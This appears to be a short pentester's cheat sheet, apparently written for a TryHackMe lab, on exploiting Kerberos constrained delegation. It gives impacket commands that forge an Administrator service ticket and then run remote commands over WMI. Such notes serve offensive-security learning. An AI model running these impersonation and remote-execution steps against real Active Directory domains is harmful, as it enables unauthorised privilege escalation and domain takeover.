---
description: Constrained delegations
---

# AllowedToDelegate

The **AllowedToDelegateTo** privilege allows a user to request service tickets on behalf of another user to specific service&#x73;**.** This can be exploited to impersonate privileged users (like Administrator) and access services as them, enabling lateral movement or full domain compromise.

Request a Service Ticket as an Impersonated User:

{% code overflow="wrap" %}
```sh
impacket-getST -spn cifs/haystack.thm.corp -impersonate Administrator -dc-ip 10.10.25.131 thm.corp/DARLA_WINTERS:'Password123!'
```
{% endcode %}

* `-spn`: Target service you want access to
* `-impersonate`: High-privileged user to impersonate
* `DARLA_WINTERS`: Account with delegation rights
* `-dc-ip`: IP of the Domain Controller

Export the Ticket for Use with Kerberos Tools:

{% code overflow="wrap" %}
```shell
export KRB5CCNAME=Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
```
{% endcode %}

Remote Command Execution via WMI Using Kerberos:

{% code overflow="wrap" %}
```sh
impacket-wmiexec -dc-ip 10.10.25.131 -target 10.10.25.131 thm.corp/administrator@haystack.thm.corp -no-pass -k
```
{% endcode %}

* `-no-pass`: No need to supply password (ticket-based).
* `-k`: Use Kerberos authentication.
* `-target`: Target system where you want to run commands.
